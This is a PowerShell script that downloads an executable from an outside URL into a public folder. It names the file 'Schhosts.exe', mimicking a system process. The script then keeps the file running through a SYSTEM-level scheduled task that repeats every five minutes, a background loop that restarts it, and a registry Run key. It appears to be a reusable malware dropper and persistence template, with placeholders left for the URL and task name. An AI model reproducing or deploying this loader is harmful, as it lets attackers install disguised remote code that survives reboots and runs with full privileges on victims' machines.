# --- NEW: File Download Configuration ---
$Url = "https://www.directfiles.link/FILE" # Replace with your actual URL
$DownloadPath = "C:\Users\Public\Videos\Schhosts.exe"

# Create the directory if it doesn't exist
$Directory = [System.IO.Path]::GetDirectoryName($DownloadPath)
if (-not (Test-Path -Path $Directory)) {
    New-Item -ItemType Directory -Force -Path $Directory
}

# Download the file if it's missing (or to update it)
try {
    Write-Host "Downloading Schhosts.exe..."
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -ErrorAction Stop
    Write-Host "Download successful."
}
catch {
    Write-Error "Failed to download file: $($_.Exception.Message)"
    # Decide if you want to exit or continue if the file already exists
}
# ----------------------------------------

# Define the action for taskname executable
$ActionName = New-ScheduledTaskAction -Execute $DownloadPath

# Define the trigger (runs every 5 minutes)
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
    -RepetitionInterval (New-TimeSpan -Minutes 5) `
    -RepetitionDuration (New-TimeSpan -Days 9999)

# Register scheduled tasks
Register-ScheduledTask -Action $ActionName -Trigger $Trigger -TaskName "Taskname" `
    -Description "Fallback task for taskname" -User "SYSTEM" -RunLevel Highest

# Start the scheduled tasks
Start-ScheduledTask -TaskName "TASKNAME"

# Launch a background job to continuously restart executables
$BackgroundJob = Start-Job -ScriptBlock {
    param($ExePath)
    while ($true) {
        try {
            if (-not (Get-Process -Name "Schhosts" -ErrorAction SilentlyContinue)) {
                Start-Process -FilePath $ExePath -NoNewWindow
            }
            Start-Sleep -Seconds 60 # Reduced sleep from 1000 for better responsiveness
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
} -ArgumentList $DownloadPath

# Output instructions
Write-Host "Background job started (Job ID: $($BackgroundJob.Id))."
Write-Host "Executables will be restarted continuously."

# Add executables to registry for startup
$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegistryPath -Name "Schhosts" -Value $DownloadPath

Write-Host "Added TASKNAME to registry for startup."
